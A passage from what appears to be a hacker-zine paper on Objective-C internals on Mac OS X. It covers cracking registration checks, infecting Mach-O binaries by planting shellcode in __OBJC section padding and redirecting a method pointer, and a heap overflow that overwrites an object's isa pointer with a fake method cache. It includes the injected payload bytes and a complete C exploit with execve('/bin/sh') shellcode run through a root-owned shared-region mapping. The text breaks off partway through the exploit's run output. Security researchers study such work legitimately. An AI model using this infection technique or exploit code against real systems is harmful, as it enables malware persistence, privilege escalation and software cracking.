+before in [13]. 
+
+However, when attempting to crack Objective-C apps it's always definitely
+worth running class-dump before you do anything else, and reading over the
+output. I can't count the number of times I've seen an application which
+has a method like createRegistrationKey() which you can call from F-Script
+Anywhere, or isRegistered() which is easily noppable. With all the
+Objective-C information at your disposal cracking a majority of
+applications on Mac OS X becomes quite trivial.
+
+Honestly, lets face it, people writing applications for Mac OS X care about the
+pretty gui, not the binary protection schemes available.
+
+------[ 4.4 - Objective-C Binary Infection
+
+Again I won't spend too much time on this section. Dino let me know
+recently that Vincenzo Iozzo (snagg@openssl.it) did a talk apparently at
+Deepsec last year on infecting the Objective-C structures in a Mach-O
+binary. I couldn't find any information on it on google, so i'll release my
+technique, however if you want to read a (probably much much better
+technique) then look up Vincenzo's work.
+
+The method I propose is quite simple, it involves looking at the __OBJC
+segment for any sections with padding, then writing our shellcode into each
+of them. Then basically overwriting a methods pointer with the address of
+the start of our shellcode. When the shellcode finishes executing, the
+original address is called.
+
+While this method is more complicated/convoluted than other Mach-O
+infection techniques, no attempt to modify the entry point takes place.
+This makes it harder to detect for the uninitiated.
+
+In order to demonstrate this procedure I wrote the following tiny assembly
+code. 
+
+-[dcbz@megatron:~/code]$ cat infected.asm 
+BITS 32
+SECTION .text
+_main:
+        xor     eax,eax
+        push    byte 0xa
+        jmp     short down
+up:
+        push    eax
+        mov     al,0x04
+        push    eax  ; fake
+        int     0x80
+        jmp     short end
+down:
+        call up
+db      "infected!",0x0a,0x00
+end:
+        int3
+
+-[dcbz@megatron:~/code]$ cat tst.c
+char sc[] = 
+"\x31\xc0\x6a\x0a\xeb\x08\x50\xb0\x04\x50\xcd\x80\xeb\x10\xe8\xf3"
+"\xff\xff\xff\x69\x6e\x66\x65\x63\x74\x65\x64\x21\x0a\x00\xcc";
+
+int main(int ac, char **av)
+{
+        void (*fp)() = sc;
+        fp();
+}
+-[dcbz@megatron:~/code]$ gcc tst.c -o tst
+tst.c: In function 'main':
+tst.c:7: warning: initialization from incompatible pointer type
+-[dcbz@megatron:~/code]$ ./tst
+infected!
+Trace/BPT trap
+
+As you can see when executed this code simply prints the string
+"infected!\n" using the write() system call.
+
+This will be the parasite code, our poor little HelloWorld project will be
+the host. 
+
+The first step in our infection process is to locate a little slab of space
+in the file where we can stick our code. Our code is around 30 bytes in
+length, so we'll need around 36 bytes in order to call the old address as
+well and complete the hook.
+
+Looking at the first two sections in our OBJC segment, the first has an
+offset of 8192 and a size of 0x30 the second has an offset of 8256. 
+
+Section
+  sectname __class
+   segname __OBJC
+      addr 0x00003000
+      size 0x00000030
+    offset 8192
+     align 2^5 (32)
+    reloff 0
+    nreloc 0
+     flags 0x00000000
+ reserved1 0
+ reserved2 0
+Section
+  sectname __meta_class
+   segname __OBJC
+      addr 0x00003040
+      size 0x00000030
+    offset 8256
+     align 2^5 (32)
+    reloff 0
+    nreloc 0
+     flags 0x00000000
+ reserved1 0
+ reserved2 0
+
+If we do the math on the first part:
+
+>>> 8192 + 0x30
+8240
+
+This means there's 16 bytes of padding in the file that we can use to store
+our code.  If needed, however since our code is quite a bit bigger than
+this it would be painful to squeeze it into the padding here.
+
+Fortunately we can utilize the  __OBJC.__image_info section. There is a
+tone of padding straight after this section.
+
+Section
+  sectname __image_info
+   segname __OBJC
+      addr 0x000030c8
+      size 0x00000008
+    offset 8392
+     align 2^2 (4)
+    reloff 0
+    nreloc 0
+     flags 0x00000000
+ reserved1 0
+ reserved2 0
+
+So this is where we can store our code. 
+But first, we need to increase the size of this section in the header.
+We can do this using HTE [20]. 
+
+**** section 7 ****
+section name                                      __image_info
+segment name                                      __OBJC
+virtual address                                   000030c8
+virtual size                                      00000008
+file offset                                       000020c8
+alignment                                         00000002
+relocation file offset                            00000000
+number of relocation entries                      00000000
+flags                                             00000000
+reserved1                                         00000000
+reserved2                                         00000000  
+
+We simply press the f4 key to edit this once we're in Mach-O header mode.
+
+**** section 7 ****
+section name                                      __image_info
+segment name                                      __OBJC
+virtual address                                   000030c8
+virtual size                                      00000030
+file offset                                       000020c8
+alignment                                         00000002
+relocation file offset                            00000000
+number of relocation entries                      00000000
+flags                                             00000000
+reserved1                                         00000000
+reserved2                                         00000000  
+
+Once this is done we save our file, and return to hex edit mode.
+In hex view we press f5, and type in our file offset. 0x20c8.
+Once our cursor is at this position we move to the right 8 bytes, and then
+press f4 to enter edit mode. Then we paste our string of bytes:
+
+31c06a0aeb0850b00450cd80eb10e8f3ffffff696e666563746564210a00cc
+
+Then we save our file and run it.
+
+000020c0 ec 1f 00 00 c9 1f 00 00-00 00 00 00 00 00 00 00 |??  ??          
+000020d0 31 c0 6a 0a eb 08 50 b0-04 50 cd 80 eb 10 e8 f3 |
+000020e0 ff ff ff 69 6e 66 65 63-74 65 64 21 0a 00 cc 00 |???infected!? ?
+000020f0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 |
+
+By running this binary in gdb, we can stick a breakpoint on the main
+function and then call our shellcode in memory.
+
+Breakpoint 1, 0x00001f41 in main ()
+(gdb) set $eip=0x30d0
+(gdb) c
+Continuing.
+infected!
+
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0x000030ef in .objc_class_name_Talker ()
+
+As you see our shellcode executed fine. However we have got a problem.
+
+-[dcbz@megatron:~/code]$ ./hello
+objc[8268]: '/Users/dcbz/code/./hello' has inconsistently-compiled
+Objective-C code. Please recompile all code in it.
+Hello World!
+
+The Objective-C runtime has ratted us out!! 
+
+grep'ing the source code for this we can see the appropriate check:
+
+    // Make sure every copy of objc_image_info in this image is the same.
+    // This means same version and same bitwise contents.
+    if (result->info) {
+        const objc_image_info *start = result->info;
+        const objc_image_info *end =
+            (objc_image_info *)(info_size + (uint8_t *)start);
+        const objc_image_info *info = start;
+        while (info < end) {
+            // version is byte size, except for version 0
+            size_t struct_size = info->version;
+            if (struct_size == 0) struct_size = 2 * sizeof(uint32_t);
+            if (info->version != start->version  ||
+                0 != memcmp(info, start, struct_size))
+            {  
+                _objc_inform("'%s' has inconsistently-compiled Objective-C
+"
+                            "code. Please recompile all code in it.",
+                            _nameForHeader(header));
+            }
+            info = (objc_image_info *)(struct_size + (uint8_t *)info);
+        }
+    }
+
+     
+The way I got around this at the moment was to change the name of the
+section from __imagine_info to __1mage_info. Honestly I don't even
+understand why this section exists, but it works fine this way.
+
+**** section 7 ****
+section name                                      __1mage_info
+segment name                                      __OBJC
+virtual address                                   000030c8
+virtual size                                      00000030
+file offset                                       000020c8
+alignment                                         00000002
+relocation file offset                            00000000
+number of relocation entries                      00000000
+flags                                             00000000
+reserved1                                         00000000
+reserved2                                         00000000
+
+So now our shellcode is in memory, we need to gain control of execution
+somehow.
+
+The __inst_meth section contains a pointer to each of our methods. The way
+I plan to gain control of execution is to modify the pointer to our "say:"
+method with a pointer to our shellcode.
+
+Section
+  sectname __inst_meth
+   segname __OBJC
+      addr 0x00003070
+      size 0x00000014
+    offset 8304
+     align 2^2 (4)
+    reloff 0
+    nreloc 0
+     flags 0x00000000
+ reserved1 0
+ reserved2 0
+
+To test our theory out, we can first seek to the __inst_meth section in
+HTE...
+
+00002070 00 00 00 00 01 00 00 00-d0 1f 00 00 d5 1f 00 00 |    ?   ??  ??  
+00002080[2a 1f 00 00]07 00 00 00-10 00 00 00 bf 1f 00 00 |*?  ?   ?   ??
+00002090 a4 30 00 00 07 00 00 00-10 00 00 00 bf 1f 00 00 |?0  ?   ?   ??
+000020a0 30 20 00 00 00 00 00 00-00 00 00 00 01 00 00 00 |0           ?
+
+... And change our pointer to 0xdeadbeef as so:
+
+00002070 00 00 00 00 01 00 00 00-d0 1f 00 00 d5 1f 00 00 |    ?   ??  ??
+00002080[ef be ad de]07 00 00 00-10 00 00 00 bf 1f 00 00 |?????   ?   ??
+00002090 a4 30 00 00 07 00 00 00-10 00 00 00 bf 1f 00 00 |?0  ?   ?   ??
+000020a0 30 20 00 00 00 00 00 00-00 00 00 00 01 00 00 00 |0           ?
+
+This way when we start up our application and test it...
+
+(gdb) r
+Starting program: /Users/dcbz/code/hello 
+Reading symbols for shared libraries +++++...................... done
+
+Program received signal EXC_BAD_ACCESS, Could not access memory.
+Reason: KERN_INVALID_ADDRESS at address: 0xdeadbeef
+0xdeadbeef in ?? ()
+(gdb) 
+
+... we can see that execution control is pretty straight forward.
+
+Now if we change this value from 0xdeadbeef to the address of our shellcode
+in the __1mage_info section. (0x30c8) and run the binary, we can see the
+results.
+
+-[dcbz@megatron:~/code]$ ./hello
+infected!
+Trace/BPT trap
+
+As you can see, we have successfully gained control of execution and
+executed our shellcode, however the SIGTRAP caused by the int3 in our code
+isn't very inconspicuous. In order to fix this we'll need to add some code
+to jump back to the previous value of our method. The following
+instructions take care of this nicely:
+
+nasm > mov ecx,0xdeadbeef
+00000000  B9EFBEADDE        mov ecx,0xdeadbeef
+nasm > jmp ecx
+00000000  FFE1              jmp ecx
+
+Another thing we need to take care of before resuming execution is
+restoring the stack and registers to their previous state. This way when
+we resume execution it will be like our code never executed.
+
+The final version of our payload looks something like:
+
+BITS 32
+SECTION .text
+_main:
+        pusha
+        xor     eax,eax
+        push    byte 0xa
+        jmp     short down
+up:
+        push    eax
+        mov     al,0x04
+        push    eax  ; fake
+        int     0x80
+        jmp     short end
+down:
+        call up
+db      "infected!",0x0a,0x00
+end:
+        push    byte 16
+        pop     eax
+        add     esp,eax
+        popa
+        mov     ecx,0xdeadbeef
+        jmp     ecx
+
+If we assembly it, and change 0xdeadbeef to the address of our old function
+0x1f2a the code looks like this.
+
+6031c06a0aeb0850b00450cd80eb10e8f3ffffff696e666563746564210a006a105801c4
+61b92a1f0000ffe1
+
+We inject this into our binary using hte again...
+
+000020c0 ec 1f 00 00 c9 1f 00 00-60 31 c0 6a 0a eb 08 50 
+000020d0 b0 04 50 cd 80 eb 10 e8-f3 ff ff ff 69 6e 66 65
+000020e0 63 74 65 64 21 0a 00 6a-10 58 01 c4 61 b9 2a 1f 
+000020f0 00 00 ff e1 00 00 00 00-00 00 00 00 00 00 00 00 
+
+... and run the binary.
+
+-[dcbz@megatron:~/code]$ ./hello
+infected!
+Hello World!
+
+Presto! Our binary is infected. I'm not going to bother implementing this
+in assembly right now, but it would be easy enough to do.
+
+--[ 5 - Exploiting Objective-C Applications
+
+Hopefully at this stage you're fairly familiar with the Objective-C
+runtime. In this section we'll look at some of the considerations of
+exploiting an Objective-C application on Mac OS X.
+
+In order to explore this, we'll first start by looking at what happens when
+an object allocation (alloc method) occurs for an Objective-C class.
+
+So basically, when the alloc method is called ([Object alloc]) the
+_internal_class_creatInstanceFromZone function is called in the Objective-C
+runtime. The source code for this function is shown below.
+
+/***********************************************************************
+* _internal_class_createInstanceFromZone.  Allocate an instance of the
+* specified class with the specified number of bytes for indexed
+* variables, in the specified zone.  The isa field is set to the
+* class, C++ default constructors are called, and all other fields are zeroed.
+**********************************************************************/
+__private_extern__ id
+_internal_class_createInstanceFromZone(Class cls, size_t extraBytes,
+                                       void *zone)
+{
+    id obj;
+    size_t size;
+
+    // Can't create something for nothing
+    if (!cls) return nil;
+
+    // Allocate and initialize
+    size = _class_getInstanceSize(cls) + extraBytes;
+    if (UseGC) {
+        obj = (id) auto_zone_allocate_object(gc_zone, size,
+                                        AUTO_OBJECT_SCANNED, false, true);
+    } else if (zone) {
+        obj = (id) malloc_zone_calloc (zone, 1, size);
+    } else {
+        obj = (id) calloc(1, size);
+    }
+    if (!obj) return nil;
+
+    // Set the isa pointer
+    obj->isa = cls;
+
+    // Call C++ constructors, if any.
+    if (!object_cxxConstruct(obj)) {
+        // Some C++ constructor threw an exception. 
+        if (UseGC) {
+            auto_zone_retain(gc_zone, obj);  
+		// gc free expects retain count==1
+        }
+        free(obj);
+        return nil;
+    }
+
+    return obj;
+}
+
+As you can see, this function basically just looks up the size of the class
+and uses calloc to allocate some (zero filled) memory for it on the heap.
+
+From the code above we can see that the calls to calloc etc allocate memory 
+from the default malloc zone. This means that the class meta-data and
+contents are stored in amongst any other allocations the program makes.
+Therefore, any overflows on the heap in an objc application are liable
+to end up overflowing into objc meta-data. We can utilize this to gain
+control of execution.
+
+/***********************************************************************
+* _objc_internal_zone.
+* Malloc zone for internal runtime data.
+* By default this is the default malloc zone, but a dedicated zone is 
+* used if environment variable OBJC_USE_INTERNAL_ZONE is set.
+**********************************************************************/
+
+However, if you set the OBJC_USE_INTERNAL_ZONE environment variable before
+running the application, the Objective-C runtime will use it's own malloc
+zone. This means the objc meta-data will be stored in another mapping, and
+will stop these attacks. This is probably worth doing for any services you
+run regularly (written in objective-c) just to mix up the address space a
+bit.
+
+The first thing we'll look at, in regards to this process, is how the class
+size is calculated. This will determine which region on the heap this
+allocation takes place from. (Tiny/Small/Large/Huge). For more information
+on how the userspace heap implementation (Bertrand's malloc) works, you can
+check my heap exploitation techniques paper [11].]
+
+As you saw in the code above, when the 
+_internal_class_createInstanceFromZone function wants to determine the size
+of a class, the first step it takes is to call the _class_getInstanceSize() 
+function.
+
+This basically just looks up the instance_size attribute from inside our
+class struct. This means we can easily predict which region of the heap our
+particular object will reside.
+
+Ok, so now we're familiar with how the object is allocated we can explore
+this in memory.
+
+The first step is to copy the HelloWorld sample application we made earlier
+to ofex1 as so...
+
+-[dcbz@megatron:~/code]$ cp -r HelloWorld/ ofex1
+
+We can then modify the hello.c file to perform an allocation with malloc()
+prior to the class being alloc'ed.
+
+The code then uses strcpy() to copy the first argument to this program into
+our small buffer on the heap. With a large argument this should overflow
+into our objective-c object.
+
+include <stdio.h>
+#include <stdlib.h>
+#import "Talker.h"
+
+int main(int ac, char **av)
+{
+        char *buf = malloc(25);
+        Talker *talker = [[Talker alloc] init];
+        printf("buf: 0x%x\n",buf);
+        printf("talker: 0x%x\n",talker);
+        if(ac != 2) {
+                exit(1);
+        }
+        strcpy(buf,av[1]);
+        [talker say: "Hello World!"];
+        [talker release];
+}
+
+Now if we recompile our sample code, and fire up gdb, passing in a long
+argument, we can begin to investigate what's needed to gain control of
+execution.
+
+(gdb) r `perl -e'print "A"x5000'`
+Starting program: /Users/dcbz/code/ofex1/build/hello `perl -e'print
+"A"x5000'`
+buf: 0x103220
+talker: 0x103260
+
+Program received signal EXC_BAD_ACCESS, Could not access memory.
+Reason: KERN_INVALID_ADDRESS at address: 0x41414161
+0x9470d688 in objc_msgSend ()
+
+As you can see from the output above, buf is 64 bytes lower on the heap
+than talker. This means overflowing 68 bytes will overwrite the isa pointer
+in our class struct.
+
+This time we run the program again, however we stick 0xcafebabe where our
+isa pointer should be.
+
+(gdb) r `perl -e'print "A"x64,"\xbe\xba\xfe\xca"'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /Users/dcbz/code/ofex1/build/hello `perl -e'print
+"A"x64,"\xbe\xba\xfe\xca"'`
+buf: 0x1032c0
+talker: 0x103300
+
+Program received signal EXC_BAD_ACCESS, Could not access memory.
+Reason: KERN_INVALID_ADDRESS at address: 0xcafebade
+0x9470d688 in objc_msgSend ()
+(gdb) x/i $pc
+0x9470d688 <objc_msgSend+24>:   mov    edi,DWORD PTR [edx+0x20]
+(gdb) i r edx
+edx            0xcafebabe       -889275714
+
+We have now controlled the ISA pointer and a crash has occured offsetting
+this by 0x20 and reading. However, we're unsure at this stage what exactly
+is going on here. 
+
+In order to explore this, let's take a look at the source code for
+objc_msgSend again.
+
+// load receiver and selector
+        movl    selector(%esp), %ecx
+        movl    self(%esp), %eax
+
+// check whether selector is ignored
+        cmpl    $ kIgnore, %ecx
+        je      LMsgSendDone            // return self from %eax
+
+// check whether receiver is nil
+        testl   %eax, %eax
+        je      LMsgSendNilSelf
+
+// receiver (in %eax) is non-nil: search the cache
+LMsgSendReceiverOk:
+	// -( nemo )- :: move our overwritten ISA pointer to edx.
+        movl    isa(%eax), %edx         // class = self->isa 
+	// -( nemo )- :: This is where our crash takes place.
+	// in the CachLookup macro.
+        CacheLookup WORD_RETURN, MSG_SEND, LMsgSendCacheMiss
+        movl    $kFwdMsgSend, %edx      // flag word-return for _objc_msgForward
+        jmp     *%eax                   // goto *imp
+
+
+From the code above we can determine that our crash took place within the
+CacheLookup macro. This means in order to gain control of execution from
+here we're going to need a little understanding of how method caching works
+for Objective-C classes.
+
+Let's start by taking a look at our objc_class struct again. 
+
+       struct objc_class
+        { 
+           struct objc_class* isa;
+           struct objc_class* super_class;
+           const char* name;
+           long version;
+           long info;
+           long instance_size;
+           struct objc_ivar_list* ivars;
+           struct objc_method_list** methodLists;
+           struct objc_cache* cache;
+           struct objc_protocol_list* protocols;
+        };
+
+We can see above that 32 bytes (0x20) into our struct is the cache pointer
+(a pointer to a struct objc_cache instance). Therefore the instruction that
+our crash took place in, is derefing the isa pointer (that we overwrote)
+and trying to access the cache attribute of this struct.
+
+Before we get into how the CacheLookup macro works, lets quickly
+familiarize ourselves with how the objc_cache struct looks.
+
+struct objc_cache {
+    unsigned int mask;            /* total = mask + 1 */
+    unsigned int occupied;
+    cache_entry *buckets[1];
+};
+
+The two elements we're most concerned about are the mask and buckets. The
+mask is used to resolve an index into the buckets array. I'll go into that
+process in more detail as we read the implementation of this. The buckets
+array is made up of cache_entry structs (shown below).
+
+typedef struct {
+    SEL name;     // same layout as struct old_method
+    void *unused;
+    IMP imp;  // same layout as struct old_method
+} cache_entry;
+
+Now let's step through the CachLookup source now and we can look at the
+process of checking the cache and what we control with an overflow.
+
+.macro  CacheLookup
+
+// load variables and save caller registers.
+
+        pushl   %edi                    // save scratch register
+        movl    cache(%edx), %edi       // cache = class->cache
+        pushl   %esi                    // save scratch register
+
+This initial load into edi is where our bad access is performed. We are
+able to control edx here (the isa pointer) and therefore control edi.
+
+        movl    mask(%edi), %esi        // mask = cache->mask
+
+First the cache struct is dereferenced and the "mask" is moved into esi.
+We control the outcome of this, and therefore control the mask.
+
+        leal    buckets(%edi), %edi     // buckets = &cache->buckets
+
+The address of the buckets array is moved into edi with lea. This will come
+straight after our mask and occupied fields in our fake objc_cache struct.
+
+        movl    %ecx, %edx              // index = selector
+        shrl    $$2, %edx               // index = selector >> 2
+
+The address of the selector (c string) which was passed to objc_msgSend()
+as the method name is then moved into ecx. We do not control this at all.
+I mentioned earlier that selectors are basically c strings that have been
+registered with the runtime. The process we are looking at now, is used to
+turn the Selector's address into an index into the buckets array. This
+allows for quick location of our method. As you can see above, the first
+step of this is to shift the pointer right by 2.
+
+        andl    %esi, %edx              // index &= mask
+        movl    (%edi, %edx, 4), %eax   // method = buckets[index]
+
+Next the mask is applied. Typically the mask is set to a small value
+in order to reduce our index down to a reasonable size. Since we control
+the mask, we can control this process quite effectively.
+
+Once the index is determined it is used in conjunction with the base
+address of the buckets array in order to move one of the bucket entries
+into eax.
+
+        testl   %eax, %eax              // check for end of bucket
+        je      LMsgSendCacheMiss_$0_$1_$2      // go to cache miss code
+
+If the bucket does not exist, it is assumed that a CacheMiss was performed,
+and the method is resolved manually using the technique we described early
+on in this paper.
+
+        cmpl    method_name(%eax), %ecx // check for method name match
+        je      LMsgSendCacheHit_$0_$1_$2       // go handle cache hit
+
+However if the bucket is non-zero, the first element is retrieved which
+should be the same selector that was passed in. If that is the cache, then
+it is assumed that we've found our IMP function pointer, and it is called.
+
+        addl    $$1, %edx                       // bump index ...
+        jmp     LMsgSendProbeCache_$0_$1_$2 // ... and loop
+
+Otherwise, the index is incremented and the whole process is attempted
+again until a NULL bucket is found or a CacheHit occurs.
+
+Ok, so taking this all home, lets apply what we know to our vulnerable
+sample application.
+
+We've accomplished step #1, we've overflown and controlled the isa pointer.
+The next thing we need to do is find a nice patch of memory where we can
+position our fake objective-c class information and predict it's address.
+
+There are many different techniques for this and almost all of them are
+situational. For a remote attack, you may wish to spray the heap, filling
+all the gaps in until you can predict what's at a static location. However
+in the case of a local overflow, the most reliable technique I know I wrote
+about in my "a XNU Hope" paper [13]. Basically the undocumented system call
+SYS_shared_region_map_file_np is used to map portions of a file into a
+shared mapping across all the processes on the system. Unfortunately after
+I published that paper, Apple decided to add a check to the system call to
+make sure that the file being mapped was owned by root. KF originally
+pointed this out to me when leopard was first released, and my macbook was
+lying broken under my bed. He also noted, that there were many root owned
+writable files on the system generally and so he could bypass this quite
+easily. 
+
+-[dcbz@megatron:~]$ ls -lsa /Applications/.localized 
+8 -rw-rw-r--  1 root  admin  8 Apr 11 19:54 /Applications/.localized
+
+An example of this is the /Applications/.localized file. This is at least
+writeable by the admin user, and therefore will serve our purpose in this
+case. However I have added a section to this paper (5.1) which demonstrates
+a generic technique for reimplementing this technique on Leopard. I got
+sidetracked while writing this paper and had to figure it out.
+
+For now we'll just use /Applications/.localized however, in order to reduce
+the complexity of our example.
+
+Ok so now we know where we want to write our data, but we need to work out
+exactly what to write. The lame ascii diagram below hopefully demonstrates
+my idea for what to write.
+
+       ,_____________________,
+ISA -> |                     |  
+       |        mask=0       |<-,
+       |      occupied       |  |
+   ,---|      buckets        |  |
+   '-->| fake bucket: SEL    |  |
+       | fake bucket: unused |  |
+       | fake bucket: IMP    |--|--,
+       |                     |  |  |
+       |                     |  |  |
+ISA+32>|   cache pointer     |--'  |
+       |                     |     |
+       |     SHELLCODE       |<----'
+       '_____________________'
+
+So basically what will happen, the ISA will be dereferenced and 32 will be
+added to retrieve the cache pointer which we control. The cache pointer
+will then point back to our first address where the mask value will be
+retrieved. I used the value 0x0 for the mask, this way regardless of the
+value of the selector the end result for the index will be 0. This way we
+can stick the pointer from the selector we want to support (taken from ecx
+in objc_msgSend.) at this position, and force a match. This will result in
+the IMP being called. We point the imp at our shellcode below our cache
+pointer and gain control of execution.
+
+Phew, glad that explanation is out of the way, now to show it in code,
+which is much much easier to understand. Before we begin to actually write
+the code though, we need to retrieve the value of the selector, so we can 
+use it in our code.
+
+In order to do this, we stick a breakpoint on our objc_msgSend() call in
+gdb and run the program again.
+
+(gdb) break *0x00001f83 
+Breakpoint 1 at 0x1f83
+(gdb) r AAAAAAAAAAAAAAAAAAAAA
+Starting program: /Users/dcbz/code/ofex1/build/hello AAAAAAAAAAAAAAAAAAAAA
+buf: 0x103230
+talker: 0x103270
+
+Breakpoint 1, 0x00001f83 in main ()
+(gdb) x/i $pc
+0x1f83 <main+194>:      call   0x400a <dyld_stub_objc_msgSend>
+(gdb) stepi
+0x0000400a in dyld_stub_objc_msgSend ()
+(gdb) 
+0x94e0c670 in objc_msgSend ()
+(gdb) 
+0x94e0c674 in objc_msgSend ()
+(gdb) s
+0x94e0c678 in objc_msgSend ()
+(gdb) x/s $ecx
+0x1fb6 <main+245>:       "say:"
+
+As you can see, the address of our selector is 0x1fb6.
+
+(gdb) info share $ecx
+  2 hello                 - 0x1000            exec Y Y
+/Users/dcbz/code/ofex1/build/hello (offset 0x0)
+
+If we get some information on the mapping this came from we can see it was
+directly from our binary itself. This address is going to be static each
+time we run it, so it's acceptable to use this way. 
+
+Ok now that we've got all our information intact, I'll walk through a 
+finished exploit for this.
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <mach/vm_prot.h>
+#include <mach/i386/vm_types.h>
+#include <mach/shared_memory_server.h>
+#include <string.h>
+#include <unistd.h>
+
+#define BASE_ADDR 0x9ffff000
+#define PAGESIZE  0x1000
+#define SYS_shared_region_map_file_np 295
+
+We're going to map our data, at the page 0x9ffff000-0xa0000000 this way
+we're guaranteed that we'll have an address free of NULL bytes.
+
+char nemox86exec[] = 
+// x86 execve() code / nemo
+"\x31\xc0\x50\xb0\xb7\x6a\x7f\xcd"
+"\x80\x31\xc0\x50\xb0\x17\x6a\x7f"
+"\xcd\x80\x31\xc0\x50\x68\x2f\x2f"
+"\x73\x68\x68\x2f\x62\x69\x6e\x89"
+"\xe3\x50\x54\x54\x53\x53\xb0\x3b"
+"\xcd\x80";
+ 
+
+I'm using some simple execve("/bin/sh") shellcode for this. But obviously
+this is just for local vulns.
+
+
+struct _shared_region_mapping_np {
+        mach_vm_address_t       address;
+        mach_vm_size_t          size;
+        mach_vm_offset_t        file_offset;
+        vm_prot_t               max_prot;   /* read/write/execute/COW/ZF */
+        vm_prot_t               init_prot;  /* read/write/execute/COW/ZF */
+};
+
+struct cache_entry {
+    char *name;     // same layout as struct old_method
+    void *unused;
+    void (*imp)();  // same layout as struct old_method
+};
+
+struct objc_cache {
+    unsigned int mask;            /* total = mask + 1 */
+    unsigned int occupied;
+    struct cache_entry *buckets[1];
+};
+
+struct our_fake_stuff {
+	struct objc_cache fake_cache;
+	char filler[32 - sizeof(struct objc_cache)];
+	struct objc_cache *fake_cache_ptr;
+};
+
+We define our structs here. I created a "our_fake_stuff" struct in order to
+hold the main body of our exploit. I guess I should have stuck the
+objc_cache struct we're using in here. But I'm not going to go back and
+change it now... ;p
+
+#define ROOTFILE "/Applications/.localized"
+
+This is the file which we're using to store our data before we load it into
+the shared section.
+
+int main(int ac, char **av)
+{
+	int fd;
+	struct _shared_region_mapping_np sr;
+	char data[PAGESIZE];
+	char *ptr = data + PAGESIZE - sizeof(nemox86exec) - sizeof(struct our_fake_stuff) - sizeof(struct objc_cache);
+	long knownaddress;
+	struct our_fake_stuff ofs;
+	struct cache_entry bckt;
+	#define EVILSIZE 69
+	char badbuff[EVILSIZE];
+	char *args[] = {"./build/hello",badbuff,NULL};
+	char *env[]  = {"TERM=xterm",NULL};
+
+So basically I create a char[] buff PAGESIZE in size where I store
+everything I want to map into the shared section. Then I write the whole
+thing to a file. args and env are used when I execve the vulnerable
+program.
+	
+	printf("[+] Opening root owned file: %s.\n", ROOTFILE);
+	if((fd=open(ROOTFILE,O_RDWR|O_CREAT))==-1)
+	{
+		perror("open");
+		exit(EXIT_FAILURE);
+	}
+
+I open the root owned file...
+
+	// fill our data buffer with nops. Why? Why not!
+	memset(data,'\x90',sizeof(data));
+
+	knownaddress = BASE_ADDR + PAGESIZE - sizeof(nemox86exec) - 
+	sizeof(struct our_fake_stuff) - sizeof(struct objc_cache);
+
+knownaddress is a pointer to the start of our data. We position all our
+data towards the end of the mapping to reduce the chance of NULL bytes.
+
+	ofs.fake_cache.mask       = 0x0;        // mask = 0 
+	ofs.fake_cache.occupied   = 0xcafebabe; // occupied
+	ofs.fake_cache.buckets[0] = knownaddress + sizeof(ofs);
+
+The ofs struct is set up according to the method documented above. The mask
+is set to 0, so that our index ends up becoming 0. Occupied can be any
+value, I set it to 0xcafebabe for fun. Our buckets pointer basically just
+points straight after itself. This is where our cache_entry struct is going
+to be stored.
+
+	bckt.name   = (char *)0x1fb6; // our SEL
+	bckt.unused = (void *)0xbeef; // unused
+	bckt.imp    = (void (*)())(knownaddress + 
+			sizeof(struct our_fake_stuff) + 
+			sizeof(struct objc_cache)); // our shellcode
+
+Now we set up the cache_entry struct. Name is set to our selector value
+which we noted down earlier. Unused can be set to anything. Finally imp is
+set to the end of both of our structs. This function pointer will be called
+by the objective-c runtime, after our structs are processed. 
+
+	// set our filler to "A", who cares.
+	memset(ofs.filler,'\x41',sizeof(ofs.filler));
+	ofs.fake_cache_ptr = (struct objc_cache *)knownaddress;
+
+Next, we fill our filler with "A", this can be anything, it's just a pad so
+that our fake_cache_ptr will be 32 bytes from the start of our ISA struct.
+Our fake_cache_ptr is set up to point back to the start of our data
+(knownaddress). This way our fake_cache struct is processed by the runtime.
+
+	// stick our struct in data.
+	memcpy(ptr,&ofs,sizeof(ofs));
+	// stick our cache entry after that
+	memcpy(ptr+sizeof(ofs),&bckt,sizeof(bckt));
+	// stick our shellcode after our struct in data.
+	memcpy(ptr+sizeof(ofs)+sizeof(bckt),nemox86exec
+		,sizeof(nemox86exec));
+
+Now that our structs are set up, we simply memcpy() each of them into the
+appropriate position within the data[] blob....
+
+	printf("[+] Writing out data to file.\n");
+	if(write(fd,data,PAGESIZE) != PAGESIZE)
+	{
+		perror("write");
+		exit(EXIT_FAILURE);
+	}
+
+... And write this out to our file.
+
+	sr.address     = BASE_ADDR;
+	sr.size        = PAGESIZE;
+	sr.file_offset = 0;
+	sr.max_prot    = VM_PROT_EXECUTE | VM_PROT_READ | VM_PROT_WRITE;
+	sr.init_prot   = VM_PROT_EXECUTE | VM_PROT_READ | VM_PROT_WRITE; 
+
+	printf("[+] Mapping file to shared region.\n");
+
+	if(syscall(SYS_shared_region_map_file_np,fd,1,&sr,NULL)==-1)
+	{
+		perror("shared_region_map_file_np");
+		exit(EXIT_FAILURE);
+	}
+
+
+	close(fd);
+
+Our file is then mapped into the shared region, and our fd discarded.
+
+	printf("[+] Fake Objective-C chunk at: 0x%x.\n", knownaddress);
+
+	memset(badbuff,'\x41',sizeof(badbuff));
+	//knownaddress = 0xcafebabe;
+	badbuff[sizeof(badbuff) - 1] = 0x0;
+	badbuff[sizeof(badbuff) - 2] = (knownaddress & 0xff000000) >> 24;
+	badbuff[sizeof(badbuff) - 3] = (knownaddress & 0x00ff0000) >> 16;
+	badbuff[sizeof(badbuff) - 4] = (knownaddress & 0x0000ff00) >>  8;
+	badbuff[sizeof(badbuff) - 5] = (knownaddress & 0x000000ff) >>  0;
+	printf("[+] Executing vulnerable app.\n");
+
+Before finally we set up our badbuff, which will be argv[1] within our
+vulnerable application. knownaddress (The address of our data now stored
+within the shared region.) is used as the ISA pointer.
+
+	execve(*args,args,env);
+
+	// not reached.
+	exit(0);
+}
+
+For your convenience I will include a copy of this exploit/vuln along with
+most of the other code in this paper, uuencoded at the end.
+
+As you can see from the following output, running our exploit works as
+expected. We're dropped to a shell. (NOTE: I chown root;chmod +s'ed the
+build/hello file for effect.)
+
+-[dcbz@megatron:~/code/ofex1]$ ./exploit 
+[+] Opening root owned file: /Applications/.localized.
+[+] Writing out data to file.
+[+] Mapping file to shared region.
+[+] Fake Objective-C chunk at: 0x9fffffa5.
+[+] Executing vulnerable app.
+buf: 0x103500
